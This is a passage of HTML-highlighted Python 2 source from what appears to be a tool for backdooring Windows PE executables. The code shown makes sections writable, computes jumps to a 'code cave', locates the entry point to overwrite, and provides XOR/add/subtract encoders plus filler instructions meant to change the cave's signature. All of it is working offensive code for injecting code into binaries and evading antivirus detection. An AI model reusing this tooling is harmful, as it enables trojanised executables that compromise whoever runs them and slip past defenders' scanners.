style="color:#3ad900;font-weight:400">"h"</span>)[<span style="color:#ff0044;font-weight:400">0</span>]<br />					stop&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(num2.strip(),&nbsp;<span style="color:#ff0044;font-weight:400">16</span>)<br />				<span style="color:#ff9d00;font-weight:700">except</span>:<br />					stop&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(stop.strip())<br />				<br />				<br />				stop&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(start)&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(stop)<br /><br />			<span style="color:#ff9d00;font-weight:700">except</span>:<br />				<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[!]&nbsp;ERROR:&nbsp;Invalid&nbsp;Parameters&nbsp;provided&nbsp;--&nbsp;%s&nbsp;%s&nbsp;"</span>&nbsp;%&nbsp;(sys.exc_info()[<span style="color:#ff0044;font-weight:400">0</span>],&nbsp;sys.exc_info()[<span style="color:#ff0044;font-weight:400">1</span>])<br />				sys.exit(<span style="color:#ff0044;font-weight:400">2</span>)<br />				<br />			<span style="color:#ff9d00;font-weight:700">try</span>:<br />				section_header&nbsp;=&nbsp;get_section_header(pe,&nbsp;section_name)<br />				section_start_address&nbsp;=&nbsp;section_header.VirtualAddress<br />			<span style="color:#ff9d00;font-weight:700">except</span>:<br />				<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[!]&nbsp;ERROR:&nbsp;Could&nbsp;not&nbsp;retrieve&nbsp;section&nbsp;information.&nbsp;Check&nbsp;section&nbsp;name&nbsp;and&nbsp;try&nbsp;again"</span><br />				sys.exit(<span style="color:#ff0044;font-weight:400">2</span>)<br />			<br />			<span style="color:#ff9d00;font-weight:700">try</span>:<br />				data&nbsp;=&nbsp;retrieve_data(pe,&nbsp;section_name,&nbsp;<span style="color:#3ad900;font-weight:400">"virtual"</span>)<br />				unprintable_chars&nbsp;=&nbsp;[<span style="color:#3ad900;font-weight:400">"0a"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"0d"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"09"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"0b"</span>]<br />				offset&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">hex</span>(section_start_address&nbsp;+&nbsp;start&nbsp;-&nbsp;<span style="color:#ff0044;font-weight:400">16</span>)<br />				byte_line&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />				char_line&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />				total_count&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />				line_count&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />				<br />				<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;%i&nbsp;bytes&nbsp;of&nbsp;%s&nbsp;section&nbsp;at&nbsp;offset&nbsp;%sd&nbsp;(%s)&nbsp;from&nbsp;section&nbsp;section&nbsp;start&nbsp;(%s)\n\n"</span>&nbsp;%&nbsp;((stop&nbsp;-&nbsp;start),&nbsp;section_name,&nbsp;start,&nbsp;<span style="color:#ff9d00;font-weight:700">hex</span>(start),&nbsp;<span style="color:#ff9d00;font-weight:700">hex</span>(section_start_address))<br />				<br />				<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Offset(h)&nbsp;00&nbsp;01&nbsp;02&nbsp;03&nbsp;04&nbsp;05&nbsp;06&nbsp;07&nbsp;08&nbsp;09&nbsp;0A&nbsp;0B&nbsp;0C&nbsp;0D&nbsp;0E&nbsp;0F\n"</span><br />				<span style="color:#0088ff;font-weight:400">#&nbsp;print&nbsp;bytes,&nbsp;16&nbsp;at&nbsp;a&nbsp;time&nbsp;in&nbsp;both&nbsp;hex&nbsp;and&nbsp;ascii&nbsp;values</span><br />				<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;byte&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;data:<br />					<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;total_count&nbsp;&lt;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(stop):<br />						<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;total_count&nbsp;&gt;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(start):<br />							<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;line_count&nbsp;&lt;=&nbsp;<span style="color:#ff0044;font-weight:400">16</span>:<br />								byte_line&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;"</span>+byte<br />								<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;byte&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;unprintable_chars:<br />									char_line&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"."</span><br />								<span style="color:#ff9d00;font-weight:700">else</span>:<br />									byte&nbsp;=&nbsp;binascii.unhexlify(byte)<br />									char_line&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;"</span>+byte<br />								line_count&nbsp;+=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />							<span style="color:#ff9d00;font-weight:700">else</span>:<br />								offset&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">hex</span>(section_start_address&nbsp;+&nbsp;total_count&nbsp;-&nbsp;<span style="color:#ff0044;font-weight:400">16</span>)<br />								<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;offset&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;"</span>&nbsp;+&nbsp;byte_line&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;||&nbsp;"</span>&nbsp;+&nbsp;char_line<br />								line_count&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />								byte_line&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />								char_line&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />					total_count&nbsp;+=&nbsp;<span style="color:#ff0044;font-weight:400">1</span>	<br />				<br />				<span style="color:#0088ff;font-weight:400">#&nbsp;print&nbsp;any&nbsp;remaining&nbsp;bytes&nbsp;</span><br />				<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;byte_line&nbsp;!=&nbsp;<span style="color:#3ad900;font-weight:400">""</span>:<br />					spacers&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">48</span>&nbsp;-&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(byte_line)<br />					<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#ff9d00;font-weight:700">hex</span>(<span style="color:#ff9d00;font-weight:700">int</span>(offset,&nbsp;<span style="color:#ff0044;font-weight:400">16</span>)&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">16</span>)&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;"</span>&nbsp;+&nbsp;byte_line&nbsp;+&nbsp;(<span style="color:#3ad900;font-weight:400">"&nbsp;"</span>&nbsp;*&nbsp;(spacers))&nbsp;+<span style="color:#3ad900;font-weight:400">"&nbsp;||&nbsp;"</span>&nbsp;+&nbsp;char_line<br />					<br />			<span style="color:#ff9d00;font-weight:700">except</span>:<br />				<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[!]&nbsp;ERROR:&nbsp;%s&nbsp;%s&nbsp;"</span>&nbsp;%&nbsp;(sys.exc_info()[<span style="color:#ff0044;font-weight:400">0</span>],&nbsp;sys.exc_info()[<span style="color:#ff0044;font-weight:400">1</span>])<br /><br /><span style="color:#3ad900;font-weight:400">'''<br />	Return&nbsp;the&nbsp;relative&nbsp;jump&nbsp;location&nbsp;for&nbsp;the&nbsp;new&nbsp;section&nbsp;<br />	that&nbsp;will&nbsp;hold&nbsp;our&nbsp;code&nbsp;cave<br />'''</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;get_virtual_offset(virtual_address,&nbsp;pe):<br />	<span style="color:#0088ff;font-weight:400">#return&nbsp;relative&nbsp;jump&nbsp;location&nbsp;for&nbsp;code&nbsp;cave&nbsp;=&nbsp;section.VirtualAddress&nbsp;+&nbsp;pe.OPTIONAL_HEADER.ImageBase		</span><br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">"L"</span>,virtual_address&nbsp;-&nbsp;pe.OPTIONAL_HEADER.AddressOfEntryPoint)	<br /><br /><span style="color:#3ad900;font-weight:400">'''<br />	Make&nbsp;section&nbsp;of&nbsp;the&nbsp;pe&nbsp;file&nbsp;writable<br />'''</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;make_section_writeable(pe,&nbsp;name):<br />	<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;section&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;pe.sections:<br />		<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(name.strip().lower()&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;section.Name.strip().lower()):<br />			<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;section.Characteristics&nbsp;!=&nbsp;<span style="color:#ff0044;font-weight:400">0xE0000020</span>:<br />				section.Characteristics&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0xE0000020</span><br />				<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;PE&nbsp;%s&nbsp;section&nbsp;made&nbsp;writeable&nbsp;with&nbsp;attribute&nbsp;0xE0000020"</span>&nbsp;%&nbsp;name<br />				<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;pe<br />			<span style="color:#ff9d00;font-weight:700">else</span>:<br />				<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Verified&nbsp;PE&nbsp;%s&nbsp;section&nbsp;is&nbsp;already&nbsp;writeable"</span>&nbsp;<br />				<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;pe<br />				<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[!]&nbsp;Could&nbsp;not&nbsp;make&nbsp;%s&nbsp;section&nbsp;writeable"</span>&nbsp;%&nbsp;name<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#ff0044;font-weight:400">False</span><br /><br /><span style="color:#3ad900;font-weight:400">'''&nbsp;<br />	Locate&nbsp;the&nbsp;physical&nbsp;address&nbsp;of&nbsp;the&nbsp;file&nbsp;to&nbsp;overwrite&nbsp;<br />	which&nbsp;will&nbsp;be&nbsp;located&nbsp;at&nbsp;an&nbsp;offset&nbsp;from&nbsp;the&nbsp;PointerToRawData.&nbsp;This&nbsp;offset<br />	is&nbsp;calculated&nbsp;by&nbsp;subtracting&nbsp;the&nbsp;base&nbsp;code&nbsp;address&nbsp;from&nbsp;the&nbsp;entry&nbsp;point&nbsp;address.<br />'''</span>	<br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;find_overwrite_location(pe):<br />	section_header&nbsp;=&nbsp;pe.get_section_by_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)<br />	raw_data&nbsp;=&nbsp;section_header.PointerToRawData<br />	overwrite_offset&nbsp;=&nbsp;pe.OPTIONAL_HEADER.AddressOfEntryPoint&nbsp;-&nbsp;pe.OPTIONAL_HEADER.BaseOfCode<br />	overwrite_location&nbsp;=&nbsp;raw_data&nbsp;+&nbsp;overwrite_offset<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;overwrite_location<br /><br /><span style="color:#3ad900;font-weight:400">'''<br />	Various&nbsp;functions&nbsp;to&nbsp;modify&nbsp;bytes&nbsp;within&nbsp;a&nbsp;given&nbsp;section<br />'''</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;swap&nbsp;case&nbsp;of&nbsp;lower&nbsp;and&nbsp;upper&nbsp;ASCII&nbsp;letters</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;swap_case(byte,&nbsp;lowercase,&nbsp;uppercase):<br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;byte&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;lowercase:<br />		byte&nbsp;=&nbsp;uppercase[lowercase.index(byte)]<br />	<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;byte&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;uppercase:<br />		byte&nbsp;=&nbsp;lowercase[uppercase.index(byte)]<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;byte<br /><br /><span style="color:#0088ff;font-weight:400">#&nbsp;zero&nbsp;out&nbsp;all&nbsp;ASCII&nbsp;letters</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;zero_letters(byte,&nbsp;lowercase,&nbsp;uppercase):<br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(byte&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;lowercase)&nbsp;<span style="color:#ff9d00;font-weight:700">or</span>&nbsp;(byte&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;uppercase):<br />		byte&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"00"</span><br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;byte<br />	<br /><span style="color:#0088ff;font-weight:400">#&nbsp;zero&nbsp;out&nbsp;all&nbsp;non-ASCII&nbsp;letters	</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;zero_nonletters(byte,&nbsp;lowercase,&nbsp;uppercase):<br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(byte&nbsp;<span style="color:#ff9d00;font-weight:700">not</span>&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;lowercase)&nbsp;<span style="color:#ff9d00;font-weight:700">and</span>&nbsp;(byte&nbsp;<span style="color:#ff9d00;font-weight:700">not</span>&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;uppercase):<br />		byte&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"00"</span><br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;byte<br /><br /><span style="color:#3ad900;font-weight:400">'''&nbsp;<br />	Modify&nbsp;a&nbsp;given&nbsp;range&nbsp;of&nbsp;bytes&nbsp;in&nbsp;a&nbsp;section&nbsp;using&nbsp;the&nbsp;preceding&nbsp;modification&nbsp;functions<br />	You&nbsp;can&nbsp;do&nbsp;this&nbsp;a&nbsp;bit&nbsp;more&nbsp;elegantly&nbsp;by&nbsp;using&nbsp;a&nbsp;hex&nbsp;range&nbsp;and&nbsp;simply&nbsp;adding&nbsp;/&nbsp;subtracting&nbsp;<br />	20h&nbsp;to&nbsp;obtain&nbsp;the&nbsp;corresponding&nbsp;swapped&nbsp;letter&nbsp;(TODO)<br />'''</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;mod_section(pe,&nbsp;section_name,&nbsp;mod_type,&nbsp;mod_range):<br />	<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;ASCII&nbsp;letters&nbsp;hex</span><br />	lowercase&nbsp;=&nbsp;[<span style="color:#3ad900;font-weight:400">"61"</span>,<span style="color:#3ad900;font-weight:400">"62"</span>,<span style="color:#3ad900;font-weight:400">"63"</span>,<span style="color:#3ad900;font-weight:400">"64"</span>,<span style="color:#3ad900;font-weight:400">"65"</span>,<span style="color:#3ad900;font-weight:400">"66"</span>,<span style="color:#3ad900;font-weight:400">"67"</span>,<span style="color:#3ad900;font-weight:400">"68"</span>,<span style="color:#3ad900;font-weight:400">"69"</span>,<span style="color:#3ad900;font-weight:400">"6a"</span>,<span style="color:#3ad900;font-weight:400">"6b"</span>,<span style="color:#3ad900;font-weight:400">"6c"</span>,<span style="color:#3ad900;font-weight:400">"6d"</span>,<span style="color:#3ad900;font-weight:400">"6e"</span>,<span style="color:#3ad900;font-weight:400">"6f"</span>,<span style="color:#3ad900;font-weight:400">"70"</span>,<span style="color:#3ad900;font-weight:400">"71"</span>,<span style="color:#3ad900;font-weight:400">"72"</span>,<span style="color:#3ad900;font-weight:400">"73"</span>,<span style="color:#3ad900;font-weight:400">"74"</span>,<span style="color:#3ad900;font-weight:400">"75"</span>,<span style="color:#3ad900;font-weight:400">"76"</span>,<span style="color:#3ad900;font-weight:400">"77"</span>,<span style="color:#3ad900;font-weight:400">"78"</span>,<span style="color:#3ad900;font-weight:400">"79"</span>,<span style="color:#3ad900;font-weight:400">"7a"</span>]<br />	uppercase&nbsp;=&nbsp;[<span style="color:#3ad900;font-weight:400">"41"</span>,<span style="color:#3ad900;font-weight:400">"42"</span>,<span style="color:#3ad900;font-weight:400">"43"</span>,<span style="color:#3ad900;font-weight:400">"44"</span>,<span style="color:#3ad900;font-weight:400">"45"</span>,<span style="color:#3ad900;font-weight:400">"46"</span>,<span style="color:#3ad900;font-weight:400">"47"</span>,<span style="color:#3ad900;font-weight:400">"48"</span>,<span style="color:#3ad900;font-weight:400">"49"</span>,<span style="color:#3ad900;font-weight:400">"4a"</span>,<span style="color:#3ad900;font-weight:400">"4b"</span>,<span style="color:#3ad900;font-weight:400">"4c"</span>,<span style="color:#3ad900;font-weight:400">"4d"</span>,<span style="color:#3ad900;font-weight:400">"4e"</span>,<span style="color:#3ad900;font-weight:400">"4f"</span>,<span style="color:#3ad900;font-weight:400">"50"</span>,<span style="color:#3ad900;font-weight:400">"51"</span>,<span style="color:#3ad900;font-weight:400">"52"</span>,<span style="color:#3ad900;font-weight:400">"53"</span>,<span style="color:#3ad900;font-weight:400">"54"</span>,<span style="color:#3ad900;font-weight:400">"55"</span>,<span style="color:#3ad900;font-weight:400">"56"</span>,<span style="color:#3ad900;font-weight:400">"57"</span>,<span style="color:#3ad900;font-weight:400">"48"</span>,<span style="color:#3ad900;font-weight:400">"49"</span>,<span style="color:#3ad900;font-weight:400">"5a"</span>]<br />	<br />	<span style="color:#ff9d00;font-weight:700">try</span>:<br />		make_section_writeable(pe,&nbsp;section_name)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;make&nbsp;the&nbsp;section&nbsp;writeable&nbsp;before&nbsp;attempting&nbsp;modifications</span><br />		section_header&nbsp;=&nbsp;get_section_header(pe,&nbsp;section_name)<br />		section_start&nbsp;=&nbsp;section_header.PointerToRawData<br />		section_stop&nbsp;=&nbsp;section_start&nbsp;+&nbsp;section_header.Misc_VirtualSize<br />		data&nbsp;=&nbsp;binascii.hexlify(pe.get_memory_mapped_image()[section_start:section_stop])&nbsp;<br />		data&nbsp;=&nbsp;re.findall(<span style="color:#3ad900;font-weight:400">r'.{1,2}'</span>,data,re.DOTALL)<br />	<span style="color:#ff9d00;font-weight:700">except</span>:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[!]&nbsp;ERROR:&nbsp;Could&nbsp;not&nbsp;retrieve&nbsp;section&nbsp;information&nbsp;for&nbsp;modification.&nbsp;Check&nbsp;section&nbsp;name&nbsp;and&nbsp;try&nbsp;again."</span><br />		sys.exit(<span style="color:#ff0044;font-weight:400">2</span>)<br />	<br />	<span style="color:#ff9d00;font-weight:700">try</span>:<br />		<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(mod_range.split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">0</span>])&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>:<br />			mod_lower&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;if&nbsp;provided&nbsp;value&nbsp;is&nbsp;smaller&nbsp;than&nbsp;the&nbsp;section,&nbsp;use&nbsp;section&nbsp;start</span><br />		<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(mod_range.split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">0</span>])&nbsp;&gt;&nbsp;section_header.Misc_VirtualSize:<br />			<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[!]&nbsp;Invalid&nbsp;values&nbsp;provided&nbsp;for&nbsp;section&nbsp;modification&nbsp;range.&nbsp;Skipping&nbsp;this&nbsp;step"</span><br />			<span style="color:#ff9d00;font-weight:700">return</span><br />		<span style="color:#ff9d00;font-weight:700">else</span>:<br />			mod_lower&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(mod_range.split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">0</span>])	<br />		<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(mod_range.split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">1</span>])&nbsp;&gt;&nbsp;section_header.Misc_VirtualSize:<br />			mod_upper&nbsp;=&nbsp;section_header.Misc_VirtualSize&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;if&nbsp;provided&nbsp;value&nbsp;is&nbsp;bigger&nbsp;than&nbsp;the&nbsp;section,&nbsp;use&nbsp;section&nbsp;stop</span><br />		<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(mod_range.split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">1</span>])&nbsp;&lt;&nbsp;mod_lower:<br />			<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[!]&nbsp;Invalid&nbsp;values&nbsp;provided&nbsp;for&nbsp;section&nbsp;modification&nbsp;range.&nbsp;Skipping&nbsp;this&nbsp;step"</span><br />			<span style="color:#ff9d00;font-weight:700">return</span><br />		<span style="color:#ff9d00;font-weight:700">else</span>:<br />			mod_upper&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(mod_range.split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">1</span>])<br />	<span style="color:#ff9d00;font-weight:700">except</span>:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[!]&nbsp;Invalid&nbsp;values&nbsp;provided&nbsp;for&nbsp;section&nbsp;modification&nbsp;range.&nbsp;Skipping&nbsp;this&nbsp;step"</span><br />		<span style="color:#ff9d00;font-weight:700">return</span><br />	<br />	modification&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	modified_data&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	count&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />	<br />	<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;(count&nbsp;&lt;=&nbsp;mod_upper):<br />		<br />		<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;byte&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;data:<br />			byte&nbsp;=&nbsp;byte.lower()<br />			<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;count&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(mod_lower,&nbsp;mod_upper):<br />				<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;mod_type&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"1"</span>:<br />					byte&nbsp;=&nbsp;swap_case(byte,&nbsp;lowercase,&nbsp;uppercase)<br />					modification&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"Letters&nbsp;swapped"</span><br />				<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;mod_type&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"2"</span>:<br />					byte&nbsp;=&nbsp;zero_letters(byte,&nbsp;lowercase,&nbsp;uppercase)<br />					modification&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"Letters&nbsp;zeroed"</span><br />				<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;mod_type&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"3"</span>:<br />					byte&nbsp;=&nbsp;zero_nonletters(byte,&nbsp;lowercase,&nbsp;uppercase)<br />					modification&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"Non-letters&nbsp;swapped"</span><br />				<span style="color:#ff9d00;font-weight:700">else</span>:<br />					<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[!]&nbsp;Invalid&nbsp;mod&nbsp;option&nbsp;provided.&nbsp;No&nbsp;modification&nbsp;mades"</span><br />					<span style="color:#ff9d00;font-weight:700">return</span><br />			modified_data&nbsp;+=&nbsp;byte<br />			count&nbsp;+=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />					<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;%s&nbsp;in&nbsp;range&nbsp;%i&nbsp;to&nbsp;%i&nbsp;in&nbsp;section&nbsp;%s"</span>&nbsp;%&nbsp;(modification,&nbsp;mod_lower,&nbsp;mod_upper,&nbsp;section_name)<br />		<br />		<span style="color:#0088ff;font-weight:400">#&nbsp;write&nbsp;encoded&nbsp;data&nbsp;to&nbsp;image</span><br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Writing&nbsp;modified&nbsp;%s&nbsp;section&nbsp;to&nbsp;file"</span>&nbsp;%&nbsp;section_name<br />		raw_text_start&nbsp;=&nbsp;section_header.PointerToRawData<br />		pe.set_bytes_at_offset(raw_text_start,&nbsp;binascii.unhexlify(modified_data))<br /><br /><span style="color:#3ad900;font-weight:400">'''&nbsp;<br />	various&nbsp;encoding&nbsp;functions<br />'''</span>		<br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;do_xor(value_in,&nbsp;xor_val):<br />	xor&nbsp;=&nbsp;value_in&nbsp;^&nbsp;xor_val<br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(xor&nbsp;&gt;=&nbsp;<span style="color:#ff0044;font-weight:400">256</span>)&nbsp;<span style="color:#ff9d00;font-weight:700">or</span>&nbsp;(xor&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>):<br />		xor&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"{:02x}"</span>.format(xor&nbsp;&amp;&nbsp;<span style="color:#ff0044;font-weight:400">0xffffffff</span>)[-<span style="color:#ff0044;font-weight:400">2</span>:]<br />		xor&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(xor,<span style="color:#ff0044;font-weight:400">16</span>)<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;xor<br /><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;do_add(value_in,&nbsp;add_val):<br />	add&nbsp;=&nbsp;value_in&nbsp;+&nbsp;add_val&nbsp;<br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(add&nbsp;&gt;=&nbsp;<span style="color:#ff0044;font-weight:400">256</span>)&nbsp;<span style="color:#ff9d00;font-weight:700">or</span>&nbsp;(add&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>):<br />		add&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"{:02x}"</span>.format(add&nbsp;&amp;&nbsp;<span style="color:#ff0044;font-weight:400">0xffffffff</span>)[-<span style="color:#ff0044;font-weight:400">2</span>:]<br />		add&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(add,&nbsp;<span style="color:#ff0044;font-weight:400">16</span>)<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;add<br /><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;do_sub(value_in,&nbsp;sub_val):<br />	sub&nbsp;=&nbsp;value_in&nbsp;-&nbsp;sub_val<br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(sub&nbsp;&gt;=&nbsp;<span style="color:#ff0044;font-weight:400">256</span>)&nbsp;<span style="color:#ff9d00;font-weight:700">or</span>&nbsp;(sub&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>):<br />		sub&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"{:02x}"</span>.format(sub&nbsp;&amp;&nbsp;<span style="color:#ff0044;font-weight:400">0xffffffff</span>)[-<span style="color:#ff0044;font-weight:400">2</span>:]<br />		sub&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(sub,&nbsp;<span style="color:#ff0044;font-weight:400">16</span>)<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;sub<br /><br /><span style="color:#3ad900;font-weight:400">'''&nbsp;<br />	Generate&nbsp;benign&nbsp;filler&nbsp;instructions&nbsp;to&nbsp;alter&nbsp;the&nbsp;code&nbsp;cave&nbsp;signature<br />	The&nbsp;filler&nbsp;instructions&nbsp;provided&nbsp;here&nbsp;are&nbsp;some&nbsp;examples.&nbsp;This&nbsp;could&nbsp;be&nbsp;expanded&nbsp;(TODO)<br />'''</span>	<br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;add_fill_instructions(limit):<br /><br />	<span 